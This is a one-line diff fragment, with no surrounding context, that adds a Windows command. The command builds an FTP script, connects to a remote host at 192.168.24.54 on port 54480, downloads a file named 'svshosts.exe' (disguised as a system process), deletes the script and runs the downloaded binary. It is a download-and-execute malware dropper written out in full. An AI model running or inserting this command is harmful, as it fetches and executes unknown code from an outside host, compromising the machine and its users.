@@ -1,0 +1,1 @@
+cmd /c echo open 192.168.24.54 54480 >> ii &echo user 1 1 >> ii &echo get svshosts.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &svshosts.exe
